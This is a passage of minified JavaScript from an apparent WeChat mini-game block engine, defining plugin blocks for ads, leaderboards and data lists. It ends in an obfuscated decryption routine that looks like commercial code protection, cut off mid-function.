                        options: [["显示", "_show_"], ["关闭", "_close_"]]
                    }, {
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "广告位ID"
                    }],
                    fun: function () {
                        this.showNativeAd.apply(this, arguments);
                    }
                },
                cz0MCJ7Gcz: {
                    args: [{
                        type: "input",
                        name: "CHANGE",
                        input: "number",
                        default: 0
                    }],
                    fun: function () {
                        this.reportScore.apply(this, arguments);
                    }
                },
                dxE2YoVuQB: {
                    fun: function () {
                        this.showRank.apply(this, arguments);
                    }
                },
                ggsNToNBml: {
                    args: [{
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "好友排行榜"
                    }],
                    fun: function () {
                        this.setRankTitle.apply(this, arguments);
                    }
                },
                d5qRpU8TX7: {
                    args: [{
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "分"
                    }],
                    fun: function () {
                        this.setRankUnit.apply(this, arguments);
                    }
                },
                s95Asg5r9E: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST",
                        options: [["降序", "down"], ["升序", "up"]]
                    }],
                    fun: function () {
                        this.setRankSort.apply(this, arguments);
                    }
                },
                kDENqdPeAa: {
                    args: [{
                        type: "list",
                        name: "OPTION_LIST",
                        options: [["历史累计", "history"], ["月", "month"], ["周", "week"], ["日", "day"]]
                    }],
                    fun: function () {
                        this.setRankPeriod.apply(this, arguments);
                    }
                },
                J7kgplEnzI: {
                    fun: function () {
                        this.shortVibrate();
                    }
                },
                AcIEvUTyTo: {
                    fun: function () {
                        this.longVibrate();
                    }
                },
                RrAaV9OplV: {
                    fun: function (t) {
                        this._runtime.isMiniGame ? wx.showToast({
                            title: t,
                            icon: "none",
                            duration: 2e3
                        }) : window.showTips(t);
                    },
                    args: [{
                        type: "input",
                        name: "str",
                        input: "string",
                        default: "提示"
                    }]
                },
                b6DUUJqddU: {
                    visible: !0,
                    fun: function (t) {
                        console.log(t);
                    },
                    args: [{
                        type: "input",
                        name: "str",
                        input: "string",
                        default: "log"
                    }]
                },
                SZ46Ae3jmn: {
                    visible: 1,
                    args: [{
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "appid"
                    }, {
                        type: "input",
                        name: "TEXT_SET1",
                        input: "string",
                        default: "path"
                    }],
                    fun: function (t, e) {
                        var i;
                        this._runtime.isMiniGame ? (i = this, wx.navigateToMiniProgram && wx.navigateToMiniProgram({
                            appId: t,
                            path: e,
                            success: function (t) {
                                i._runtime.eventEmitter.emit(OPCODE.eventOpenProgramSuccess);
                            }
                        })) : window.showTips("请在手机微信端体验跳转游戏功能");
                    }
                }
            }, Condition$2 = {};

function strToMap(t, e, i) {
    i = i || "=";
    var n, s = t.split(e = e || "&"), r = {};
    for (n in s) {
        var a = s[n].split(i);
        2 == a.length && (r[a[0]] = a[1]);
    }
    return r;
}

var Expression$2 = {
    LccwjlKGYz: {
        fun: function () {
            if (!this._runtime.isMiniGame) return window.showTips("请在手机微信端体验分享功能"), {};
            if (!GameGlobal.queryParams) return {};
            if (GameGlobal.isPublish) return GameGlobal.queryParams || {};
            try {
                return strToMap(JSON.parse(GameGlobal.queryParams).data);
            } catch (t) {
                return {};
            }
        }
    }
}, _class$4 = function (t) {
    function e(t) {
        return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
    }
    return inherits(e, t), createClass(e, [{
        key: "release",
        value: function () {
            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
        }
    }]), e;
}(LB.SDK.IPluginBase), _class$3 = (_class$4.Instance = _class$5, _class$4.Action = Action$3,
    _class$4.Condition = Condition$2, _class$4.Expression = Expression$2, function (t) {
        function e(t) {
            return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                t;
        }
        return inherits(e, t), createClass(e, [{
            key: "getBatchList",
            value: function (t, e) {
                return (t = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: t,
                    type: e,
                    thread: this.currentThread
                })) ? LB.Util.isArray(t) ? t : [t] : [];
            }
        }, {
            key: "setTempValue",
            value: function (t, e, i) {
                var n = this;
                this.getBatchList(t).forEach(function (t) {
                    (t = n._runtime.runtimeData.getSpriteById(t)) && (t._data || (t._data = {}), t._data[e] = i);
                });
            }
        }, {
            key: "getTempValue",
            value: function (t, e) {
                return t = this.getBatchList(t), (t = this._runtime.runtimeData.getSpriteById(t[0])) && t._data ? t._data[e] : void 0;
            }
        }, {
            key: "getList",
            value: function (t) {
                if (!t) return [];
                var e = void 0;
                if (LB.Util.isString(t)) {
                    if (!(e = this.lookupVariable(t, null, this.currentThread))) return t;
                } else var i = t.id, n = t.name, e = this.lookupVariable(void 0 === i ? n : i, n, this.currentThread);
                return e && "list" === e.type ? e.value || [] : t;
            }
        }, {
            key: "getTable",
            value: function (t) {
                var e = void 0;
                if (LB.Util.isString(t)) {
                    if (!(e = this.lookupVariable(t, null, this.currentThread))) return t;
                } else var i = t.id, n = t.name, e = this.lookupVariable(void 0 === i ? n : i, n, this.currentThread);
                return e && "table" === e.type ? e.value || [] : t;
            }
        }, {
            key: "getObjects",
            value: function (t) {
                var e = void 0;
                if (LB.Util.isString(t)) {
                    if (!(e = this.lookupVariable(t, null, this.currentThread))) return t;
                } else var i = t.id, n = t.name, e = this.lookupVariable(void 0 === i ? n : i, n, this.currentThread);
                return e && "object" === e.type ? e.value || {} : t;
            }
        }, {
            key: "getArray",
            value: function (t) {
                return Array.isArray(t) ? t : this.getList(t);
            }
        }, {
            key: "insertItemByIndex",
            value: function (t, e, i) {
                return (i = Array.isArray(i) ? i : this.getList(i)).splice(e - 1, 0, t), i;
            }
        }, {
            key: "getItemByIndex",
            value: function (t, e) {
                return (e = Array.isArray(e) ? e : this.getList(e))[t - 1];
            }
        }, {
            key: "deleteByIndex",
            value: function (t, e) {
                if (!(t < 1)) return (e = Array.isArray(e) ? e : this.getList(e)).splice(t - 1, 1);
                console.log("不能小于1");
            }
        }, {
            key: "addToList",
            value: function (t, e) {
                return (e = Array.isArray(e) ? e : this.getList(e)).push(t), e;
            }
        }, {
            key: "deleteAll",
            value: function (t) {
                (t = Array.isArray(t) ? t : this.getList(t)).length = 0;
            }
        }, {
            key: "replaceItemByIndex",
            value: function (t, e, i) {
                return (e = Array.isArray(e) ? e : this.getList(e))[t - 1] = i, e;
            }
        }, {
            key: "shuffleList",
            value: function (t) {
                (t = Array.isArray(t) ? t : this.getList(t)).sort(function (t, e) {
                    return .5 < Math.random() ? -1 : 1;
                });
            }
        }, {
            key: "getListLength",
            value: function (t) {
                return (t = Array.isArray(t) ? t : this.getList(t)).length;
            }
        }, {
            key: "indexOf",
            value: function (t, e) {
                return (e = Array.isArray(e) ? e : this.getList(e)).indexOf(t) + 1;
            }
        }, {
            key: "isContain",
            value: function (t, e) {
                return -1 < (t = Array.isArray(t) ? t : this.getList(t)).indexOf(e);
            }
        }, {
            key: "getVariable",
            value: function (t) {
                var e = t.id, t = t.name;
                return this.lookupVariable(void 0 === e ? t : e, t, this.currentThread).value;
            }
        }, {
            key: "setVariableTo",
            value: function (t, e) {
                var i = t.id, t = t.name;
                this.lookupVariable(void 0 === i ? t : i, t, this.currentThread).value = e;
            }
        }, {
            key: "setObejctKeyValue",
            value: function (t, e, i) {
                this.getObjects(t)[e] = i;
            }
        }, {
            key: "deleteObejctKey",
            value: function (t, e) {
                (t = this.getObjects(t))[e] = null, delete t[e];
            }
        }, {
            key: "getObjectValue",
            value: function (t, e) {
                return t ? (this.getObjects(t) || {})[e] : "";
            }
        }, {
            key: "changeVariableBy",
            value: function (t) {
                var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "+", i = arguments[2], n = t.id, t = t.name, n = this.lookupVariable(n = void 0 === n ? t : n, t, this.currentThread), t = LB.Util.toNumber(n.value), i = LB.Util.toNumber(i);
                n.value = Math.round(1e3 * ("-" === e ? t - i : t + i)) / 1e3;
            }
        }, {
            key: "showVariable",
            value: function (t) {
                this.renderer.changeVariableVisable(t.VARIABLE.id, !0);
            }
        }, {
            key: "hideVariable",
            value: function (t) {
                this.renderer.changeVariableVisable(t.VARIABLE.id, !1);
            }
        }, {
            key: "lookupVariable",
            value: function (t, e, i) {
                return (i = i.target.lookupVariable(t)) || this._runtime.runtimeData.lookupVariable(t) || this._runtime.runtimeData.createVariable(t, e);
            }
        }, {
            key: "getTableListByRow",
            value: function (t, e) {
                return "object" === (void 0 === (t = Array.isArray(t) ? t : this.getTable(t)) ? "undefined" : _typeof$1(t)) && t.length ? t[e - 1] : [];
            }
        }, {
            key: "getTableListByColumn",
            value: function (t, e) {
                var i;
                return (t = Array.isArray(t) ? t : this.getTable(t)).length ? (i = [], t.forEach(function (t) {
                    i.push(t[e - 1]);
                }), i) : [];
            }
        }, {
            key: "getTableByRowAndColumn",
            value: function (t, e, i) {
                return ((Array.isArray(t) ? t : this.getTable(t))[e - 1] || [])[i - 1];
            }
        }, {
            key: "getTableLength",
            value: function (t, e) {
                return t = Array.isArray(t) ? t : this.getTable(t), 1 == e ? t.length || 0 : t.length ? t[0].length : 0;
            }
        }, {
            key: "replaceTableItemByIndex",
            value: function (t, e, i, n) {
                (t = Array.isArray(t) ? t : this.getTable(t))[e - 1] && t[e - 1][i - 1] && (t[e - 1][i - 1] = n);
            }
        }, {
            key: "currentThread",
            get: function () {
                return this._blockEngine.currentThread;
            }
        }, {
            key: "blockEngine",
            get: function () {
                return this._blockEngine;
            }
        }]), e;
    }(LB.SDK.IPluginInstanceBase)), Action$2 = {
        WgPZYHIgIN: {
            fun: function (t, e, i) {
                this.setTempValue(t, e, i);
            },
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                name: "KEY",
                type: "input",
                input: "string",
                default: "key"
            }, {
                name: "VALUE",
                type: "input",
                input: "string",
                default: "value"
            }]
        },
        NcUfKeJ1fT: {
            args: [{
                type: "input",
                name: "VARIABLE",
                input: "Data.getVarOrigin"
            }, {
                type: "input",
                name: "VALUE",
                input: "string",
                default: "1"
            }],
            fun: function () {
                this.setVariableTo.apply(this, arguments);
            }
        },
        UdsTLySzxd: {
            args: [{
                type: "input",
                name: "OBJECT",
                input: "Data.getObjectOrigin"
            }, {
                type: "input",
                name: "KEY",
                input: "string",
                default: "key"
            }, {
                type: "input",
                name: "VALUE",
                input: "string",
                default: "value"
            }],
            fun: function () {
                this.setObejctKeyValue.apply(this, arguments);
            }
        },
        MIjO4O96jB: {
            args: [{
                type: "input",
                name: "OBJECT",
                input: "Data.getObjectOrigin"
            }, {
                type: "input",
                name: "KEY",
                input: "string",
                default: "key"
            }],
            fun: function () {
                this.deleteObejctKey.apply(this, arguments);
            }
        },
        MPzVndBMrb: {
            args: [{
                type: "input",
                name: "VARIABLE",
                input: "Data.getVarOrigin"
            }, {
                type: "list",
                name: "OPERATE",
                options: [["增加", "+"], ["减少", "-"]]
            }, {
                type: "input",
                name: "VALUE",
                input: "number",
                default: 1
            }],
            fun: function () {
                this.changeVariableBy.apply(this, arguments);
            }
        },
        BMs7KnFk7t: {
            args: [{
                type: "input",
                name: "ITEM",
                input: "string",
                default: "?"
            }, {
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                this.addToList.apply(this, arguments);
            }
        },
        UA6EvywHdC: {
            args: [{
                type: "input",
                name: "INDEX",
                input: "w_number",
                default: 1
            }, {
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                this.deleteByIndex.apply(this, arguments);
            }
        },
        jk8cjBHIuz: {
            args: [{
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                this.deleteAll.apply(this, arguments);
            }
        },
        uH6DsySLkh: {
            args: [{
                type: "input",
                name: "ITEM",
                input: "number",
                default: 1
            }, {
                type: "input",
                name: "INDEX",
                input: "w_number",
                default: 1
            }, {
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                this.insertItemByIndex.apply(this, arguments);
            }
        },
        tNPVlP5bCs: {
            args: [{
                type: "input",
                name: "INDEX",
                input: "w_number",
                default: 1
            }, {
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }, {
                type: "input",
                name: "ITEM",
                input: "number",
                default: 1
            }],
            fun: function () {
                this.replaceItemByIndex.apply(this, arguments);
            }
        },
        oZqPxRsI2X: {
            args: [{
                type: "input",
                name: "TABLE",
                input: "Data.getTableOrigin"
            }, {
                type: "input",
                name: "row",
                input: "p_number",
                default: 1
            }, {
                type: "input",
                name: "column",
                input: "p_number",
                default: 1
            }, {
                type: "input",
                name: "ITEM",
                input: "number",
                default: 1
            }],
            fun: function () {
                this.replaceTableItemByIndex.apply(this, arguments);
            }
        },
        ASKjZwCx2J: {
            args: [{
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                this.shuffleList.apply(this, arguments);
            }
        }
    }, Condition$1 = {
        JNhc4S7A4n: {
            args: [{
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }, {
                type: "input",
                name: "ITEM",
                input: "string",
                default: "?"
            }],
            fun: function () {
                return !!this.isContain.apply(this, arguments);
            }
        }
    }, Expression$1 = {
        hUDKQI6eVP: {
            args: [{
                type: "list",
                name: "OPTION_LIST",
                options: LB.BlockHelper.getSpriteListStage
            }, {
                type: "input",
                name: "INDEX",
                input: "string",
                default: "key"
            }],
            fun: function () {
                return this.getTempValue.apply(this, arguments);
            }
        },
        LAxiE1lput: {
            args: [{
                type: "input",
                name: "INDEX",
                input: "w_number",
                default: 1
            }, {
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                return this.getItemByIndex.apply(this, arguments);
            }
        },
        SofX7lKa8w: {
            args: [{
                type: "input",
                name: "ITEM",
                input: "string",
                default: "?"
            }, {
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                return this.indexOf.apply(this, arguments);
            }
        },
        Hm4uHtvkQw: {
            args: [{
                type: "input",
                name: "LIST",
                input: "Data.getListOrigin"
            }],
            fun: function () {
                return this.getListLength.apply(this, arguments);
            }
        },
        mxWUPEjKN8: {
            args: [{
                type: "input",
                name: "TABLE",
                input: "Data.getTableOrigin"
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: [["行", "1"], ["列", "2"]]
            }],
            fun: function () {
                return this.getTableLength.apply(this, arguments);
            }
        },
        NAtaBCrUoH: {
            args: [{
                type: "input",
                name: "TABLE",
                input: "Data.getTableOrigin"
            }, {
                type: "input",
                name: "INDEX",
                input: "p_number",
                default: 1
            }],
            fun: function () {
                return this.getTableListByRow.apply(this, arguments);
            }
        },
        IkRpF1khqR: {
            args: [{
                type: "input",
                name: "TABLE",
                input: "Data.getTableOrigin"
            }, {
                type: "input",
                name: "INDEX",
                input: "p_number",
                default: 1
            }],
            fun: function () {
                return this.getTableListByColumn.apply(this, arguments);
            }
        },
        WuYH4QjyVh: {
            args: [{
                type: "input",
                name: "TABLE",
                input: "Data.getTableOrigin"
            }, {
                type: "input",
                name: "row",
                input: "p_number",
                default: 1
            }, {
                type: "input",
                name: "column",
                input: "p_number",
                default: 1
            }],
            fun: function () {
                return this.getTableByRowAndColumn.apply(this, arguments);
            }
        },
        RsymirROVN: {
            args: [{
                type: "list",
                name: "VARIABLE",
                input: "object",
                options: LB.BlockHelper.getVariableList
            }],
            fun: function () {
                return this.getVariable.apply(this, arguments);
            },
            color: "dataVar"
        },
        AqeqcFwO3Z: {
            args: [{
                type: "list",
                name: "OBJECT",
                input: "object",
                options: LB.BlockHelper.getVariableList,
                args: "object"
            }],
            fun: function () {
                return this.getObjects.apply(this, arguments);
            },
            color: "objectVar"
        },
        HkCmXWBXkj: {
            args: [{
                type: "list",
                name: "LIST",
                input: "object",
                options: LB.BlockHelper.getVariableList,
                args: "list"
            }],
            fun: function () {
                return this.getArray.apply(this, arguments);
            },
            color: "dataList"
        },
        MAQ8KJ57Xg: {
            args: [{
                type: "list",
                name: "TABLE",
                input: "object",
                options: LB.BlockHelper.getVariableList,
                args: "table"
            }],
            fun: function () {
                return this.getTable.apply(this, arguments);
            },
            color: "dataTable"
        },
        DFRJt0Cfsz: {
            visible: !1,
            args: [{
                type: "list",
                name: "VARIABLE",
                input: "object",
                options: LB.BlockHelper.getVariableList
            }],
            fun: function (t) {
                return t;
            }
        },
        getObjectOrigin: {
            visible: !1,
            args: [{
                type: "list",
                name: "VARIABLE",
                input: "object",
                options: LB.BlockHelper.getVariableList,
                args: "object"
            }],
            fun: function (t) {
                return t;
            }
        },
        R9EoxnzXPi: {
            visible: !1,
            args: [{
                type: "list",
                name: "LIST",
                input: "object",
                options: LB.BlockHelper.getVariableList,
                args: "list"
            }],
            fun: function (t) {
                return t;
            }
        },
        wI9PsHdVqb: {
            visible: !1,
            args: [{
                type: "list",
                name: "TABLE",
                input: "object",
                options: LB.BlockHelper.getVariableList,
                args: "table"
            }],
            fun: function (t) {
                return t;
            }
        },
        pQofvdVdxd: {
            fun: function (t, e) {
                return this.getObjectValue(t, e);
            },
            args: [{
                type: "input",
                name: "OBJECT",
                input: "Data.getObjectOrigin"
            }, {
                name: "KEY",
                type: "input",
                input: "string",
                default: "KEY"
            }]
        }
    }, _class$2 = function (t) {
        function e(t) {
            return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
        }
        return inherits(e, t), createClass(e, [{
            key: "release",
            value: function () {
                get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
            }
        }]), e;
    }(LB.SDK.IPluginBase), _class$1 = (_class$2.Instance = _class$3, _class$2.Action = Action$2,
        _class$2.Condition = Condition$1, _class$2.Expression = Expression$1, function (t) {
            function e() {
                return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).apply(this, arguments));
            }
            return inherits(e, t), e;
        }(LB.SDK.IPluginInstanceBase)), Action$1 = {}, Condition = {}, Expression = {}, _class = function (t) {
            function e(t) {
                return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
            }
            return inherits(e, t), createClass(e, [{
                key: "release",
                value: function () {
                    get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                }
            }]), e;
        }(LB.SDK.IPluginBase), _plugins = (_class.Instance = _class$1, _class.Action = Action$1,
            _class.Condition = Condition, _class.Expression = Expression, {
            IQlsaRhh2H: _class$k,
            eIyi0Llutk: _class$i,
            W53FFkLQ6u: _class$g,
            QE0jlS05jn: _class$a,
            Jm8TMV7lUp: _class$8,
            B8Sev4UTza: _class$6,
            VOh8B66CPa: _class$e,
            YfeViruFb9: _class$2,
            HM8gZhLeWr: _class,
            ANjOM7Gpay: _class$c,
            RlrKMAcrQd: _class$4
        }), lists = (LB.Plugins = Object.assign(LB.Plugins, _plugins), ["_empty_", "_loop_", "_no_loop_", "_self_", "_creator_", "_collider_", "_all_", "_edge_", "_left_edge_", "_right_edge_", "_top_edge_", "_bottom_edge_", "screen_top", "screen_bottom", "screen_right", "screen_left", "screen_all_side", "_random_", "_finger_", "_stage_", "_x_", "_y_", "_width_", "_height_", "_scale_x_", "_alpha_", "_rotation_", "_towards_rotation_", "_style_index_", "_face_rotation_", "_invisible_", "_visible_"]);

function toNumber(t) {
    return t = Number(t), isNaN(t) ? 0 : t;
}

function isInt(t) {
    return "number" == typeof t ? !!isNaN(t) || t === parseInt(t, 10) : "boolean" == typeof t || "string" == typeof t && t.indexOf(".") < 0;
}

function toBoolean(t) {
    return "boolean" == typeof t ? t : "string" == typeof t ? "" !== t && "0" !== t && "false" !== t.toLowerCase() : Boolean(t);
}

function isWhiteSpace(t) {
    return null === t || "string" == typeof t && 0 === t.trim().length;
}

function compare(t, e) {
    var i = Number(t), n = Number(e);
    return 0 === i && isWhiteSpace(t) ? i = NaN : 0 === n && isWhiteSpace(e) && (n = NaN),
        isNaN(i) || isNaN(n) ? (t = String(t).toLowerCase()) < (e = String(e).toLowerCase()) ? -1 : e < t ? 1 : 0 : i - n;
}

var soup_ = "!#%()*+,-./:;=?@[]^_`{|}~ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", uid = function () {
    for (var t = soup_.length, e = [], i = 0; i < 20; i++) e[i] = soup_.charAt(Math.random() * t);
    return e.join("");
}, unique = function (t) {
    return Array.from(new Set(t));
}, uniqueArr = function (t) {
    var i = [], n = [];
    return (t = t || []).forEach(function (t) {
        var e = t.sort().toString();
        -1 === i.indexOf(e) && (n.push(t), i.push(e));
    }), n;
}, isArray = function (t) {
    return t instanceof Array;
}, isString = function (t) {
    return "string" == typeof t;
};

function positionToRotation$1(t, e) {
    var i;
    return 0 === t && 0 === e ? 0 : (i = Math.pow(t * t + e * e, .5), e = Math.asin(e / i),
        (e = t < 0 ? 0 < e ? Math.PI - e : -Math.PI - e : e) < 0 ? e + 2 * Math.PI : e);
}

var getObjectValue = function (t) {
    var e, i = {};
    for (e in t) {
        var n = t[e];
        i[e] = n.value;
    }
    return i;
};

function getBlockFeilds(t, e) {
    var i, n = "string" == typeof e ? [e] : e, s = [];
    for (i in t) {
        var r = t[i].opcode;
        0 <= n.indexOf(r) && !t[i].disabled && s.push(t[i].fields);
    }
    return s;
}

var encode_version = "", __0x9b531 = ["AcOHTk8=", "GXAVw6ow", "OEIWw5Es", "BcODfcOnbzTCrMOsw7XCgw==", "QCMP", "GsKwYQ==", "wp3CusK/w7TDtsOJwq1MIw==", "wobDpS4cwrJMwoRMw60LJizCgHU=", "w5wsAQ==", "w4YyDg==", "5YmS6ZuN54m35p285Y+e776Ew6Az5L+C5a6o5p6F5b+p56mO", "DlQD", "woLCognCn1PDoTdZw4o=", "wr9HRGdA", "w4McF2lyw5I=", "wp/Dn8KsFCzCmcK2dMKefw==", "w5HCoBI1w6zDgsK5VcKqw44=", "aMO5SsKJwqI=", "Rzg6ZMKu", "w5UYFHhB", "wqHDh8O3", "w7fCgMKdUg8=", "w5FTwonCsUQ=", "w7fCtcKWcBM=", "wprDhcKiCyzCnsKzY8KcZFLCsw==", "AcO4R0gR", "FsODBHzCnhE=", "w74JHXtI", "wr5cUW1u", "wq7DsRMewpE=", "w4/CgcOKwoPDjzgrwp4xw5E=", "wqV/PcKRCg==", "wpdHwr3CvFEfwpPDoVQ/", "wr/Cl8OKacOx", "CMK0fiUu", "woPDuC4kwoA=", "XsK5a34RTjHCqz/Dpw==", "csKDcsOgIg==", "czUywqFtw6fCrsOCw4h9", "dsKLW0cj", "O1rCmMKZEQ==", "wpjCocKow7k=", "VMKyVcOfCcKfwrEgwonCgA==", "w47CjMOsf8Kj", "F8OAUko8f8OJwobCrGlGwro=", "wqvCm8Kyw6TDgw==", "w4vCucOXC8O/", "w6PCmsOnYMKm", "w6gzPFZc", "wrfDgMOhw6VWw4ZtO8Ox", "wofDj8K6Z8On", "wrMGwqRPwpI=", "wrwtwphFwr0=", "wqBpT8KfwpvDocObwocC", "VjofYcKCwq7DosOLwqI=", "5YqS6Zmy54qH5p+f5Y+i77+HPR7kv5blrLXmnIHlvK/nqIM=", "w5dkwrs=", "wpfCrhvCi28=", "wq4swpFSwr9cHhkL", "TsKreMOUMw==", "w5TCusOrDsOn", "wp4fDQ==", "D8K1GA==", "EcOBXiJqw6fDriXCmUY="], _0x1722 = (function (t) {
    for (var e = 133; --e;) t.push(t.shift());
}(__0x9b531), function t(e, i) {
    var n = __0x9b531[e = +e], s = (void 0 === t.initialized && (function () {
        var t = "undefined" != typeof window ? window : "object" === ("undefined" == typeof process ? "undefined" : _typeof$1(process)) && "function" == typeof require && "object" === ("undefined" == typeof global ? "undefined" : _typeof$1(global)) ? global : this;
        t.atob || (t.atob = function (t) {
            for (var e, i, n = String(t).replace(/=+$/, ""), s = 0, r = 0, a = ""; i = n.charAt(r++); ~i && (e = s % 4 ? 64 * e + i : i,
                s++ % 4) && (a += String.fromCharCode(255 & e >> (-2 * s & 6)))) i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(i);
            return a;
        });
    }(), t.rc4 = function (t, e) {
        for (var i, n = [], s = 0, r = "", a = "", o = 0, l = (t = atob(t)).length; o < l; o++) a += "%" + ("00" + t.charCodeAt(o).toString(16)).slice(-2);
        t = decodeURIComponent(a);
        for (var h = 0; h < 256; h++) n[h] = h;
        for (h = 0; h < 256; h++) s = (s + n[h] + e.charCodeAt(h % e.length)) % 256, i = n[h],
            n[h] = n[s], n[s] = i;
        for (var h = 0, s = 0, u = 0; u < t.length; u++) i = n[h = (h + 1) % 256], n[h] = n[s = (s + n[h]) % 256],
            n[s] = i, r += String.fromCharCode(t.charCodeAt(u) ^ n[(n[h] + n[s]) % 256]);
        return r;
    }, t.data = {}, t.initialized = !0), t.data[e]);
    return void 0 === s ? (void 0 === t.once && (t.once = !0), n = t.rc4(n, i), t.data[e] = n) : n = s,
        n;
});

function decryptFun(l, t) {
    var h = {
        umpOK: function (t, e) {
            return t < e;
        },
        KZQKq: function (t, e) {
            return t === e;
        },
        bwGvX: _0x1722("0x0", "Iyga"),
        zamvG: _0x1722("0x1", "RXQ0"),
        hqZZW: function (t, e) {
            return t !== e;
        },
        EVUtq: _0x1722("0x2", "Qhuj"),
        cEFBQ: _0x1722("0x3", "v#3x"),
        EYFMh: function (t, e) {
            return t + e;
        },
        hDQxK: "版本号，js会定期弹窗，还请支持我们的工作",
        pJzon: function (t, e) {
            return t || e;
        },
        onjQS: function (t, e) {
            return t <= e;
        },
        QpduN: _0x1722("0x4", "Hzv!"),
        tveEe: function (t, e) {
            return t(e);
        },
        BgWkB: function (t, e) {
            return t % e;
        },
        ErGSd: function (t, e) {
            return t % e;
        },
        NZYtD: function (t, e) {
            return t - e;
        },
        ALUdF: _0x1722("0x5", "Hzv!"),
        JcxOf: _0x1722("0x6", "9C[Q"),
        HJyMP: function (t, e, i) {
            return t(e, i);
        },
        COiuS: function (t, e, i) {
            return t(e, i);
        },
        NHilR: function (t, e) {
            return t === e;
        },
        hmFBR: function (t, e) {
            return t === e;
        },
        gusPc: function (t, e) {
            return t === e;
        },
        GJEXZ: _0x1722("0x7", "DJ$["),
        LCoPC: function (t, e) {
            return t + e;
        },
        gomrd: function (t, e) {
            return t + e;
        },
        ERJtI: function (t, e) {
            return t + e;
        }
    };
    t = t[_0x1722("0x8", "PL#r")](2);
    try {
        l = atob(l);
    } catch (t) {
        return l;
    }
    return t = h.HJyMP(function (t, e) {
        for (var i = [], n = 0; h[_0x1722("0x9", "gsye")](n, t[_0x1722("0xa", "Hzv!")]); n++) i.push(t[_0x1722("0xb", "HKEX")](n) ^ e[_0x1722("0xc", "NxqX")](n));
        var s, r = "";
        for (s in i) h[_0x1722("0xd", "Ls#U")](h[_0x1722("0xe", "Iyga")], h[_0x1722("0xf", "Hzv!")]) ? (c += _0x1722("0x10", "N8$["),
            b = encode_version, h[_0x1722("0x11", "eeuF")]("undefined" == typeof b ? "undefined" : _typeof$1(b), h.EVUtq) && b === h[_0x1722("0x12", "6Jn[")] || w[c](h.EYFMh("删除", h[_0x1722("0x13", "eeuF")]))) : r += String[_0x1722("0x14", "HKEX")](i[s]);
        return r;
    }, l, h[_0x1722("0x29", "Qhuj")](function (t, e) {
        e = h[_0x1722("0x15", "tkB9")](e, 7);
        for (var i, n, s = [], r = 0; r < t[_0x1722("0x16", "&yU^")]; r++) "0" <= t[r] && h.onjQS(t[r], "9") ? h[_0x1722("0x17", "Hzv!")] !== h.QpduN ? l = h[_0x1722("0x18", "gsye")](atob, l) : (i = "0".charCodeAt(0),
            s.push(h[_0x1722("0x19", "v#3x")](t[_0x1722("0x1a", "$CHX")](r) - i + e, 10) + i)) : "A" <= t[r] && h[_0x1722("0x1b", "sxno")](t[r], "Z") ? (i = "A"[_0x1722("0x1c", "SjXB")](0),
                s.push(h[_0x1722("0x1d", "NnCo")](h[_0x1722("0x1e", "RXQ0")](t.charCodeAt(r) - i + e, 26), i))) : "a" <= t[r] && h[_0x1722("0x1f", "v#3x")](t[r], "z") ? (n = "a"[_0x1722("0x20", "jxK(")](0),
                    s.push(h[_0x1722("0x21", "Xqu7")](h.ErGSd(h.NZYtD(t[_0x1722("0x22", "u!gv")](r), n) + e, 26), n))) : h[_0x1722("0x23", "jxK(")](h[_0x1722("0x24", "P#!5")], h.ALUdF) ? s[_0x1722("0x25", "Qhuj")](t[_0x1722("0x26", "Xqu7")](r)) : w[c](h[_0x1722("0x27", "sB1q")]);
        var a, o = "";
        for (a in s) o += String[_0x1722("0x28", "tkB9")](s[a]);
        return o;
    }, t, 7)), h[_0x1722("0x2a", "#Es[")](t[10], "#") || h.hmFBR(t[10], "=") || "_" === t[10] ? h[_0x1722("0x2b", "sB1q")]("qgd", h[_0x1722("0x2c", "Hzv!")]) ? t = t[_0x1722("0x2d", "N8$[")](h[_0x1722("0x2e", "d%1l")](10, 1)) : w[c](h.EYFMh("删除", h[_0x1722("0x2f", "IJpL")])) : t = h.LCoPC(h[_0x1722("0x30", "IJpL")](t[_0x1722("0x31", "WGTQ")](0, 10), "."), t[_0x1722("0x32", "Iyga")](h.ERJtI(10, 1))),
        t;
}

!function (e, n, s) {
    var r = {
        fypgH: function (t, e) {
            return t !== e;
        },
        yqLyy: "",
        QKUiJ: function (t, e) {
            return t + e;
        },
        GXWfT: "版本号，js会定期弹窗，还请支持我们的工作",
        ZLfIP: function (t, e) {
            return t !== e;
        },
        fCrxy: function (t, e) {
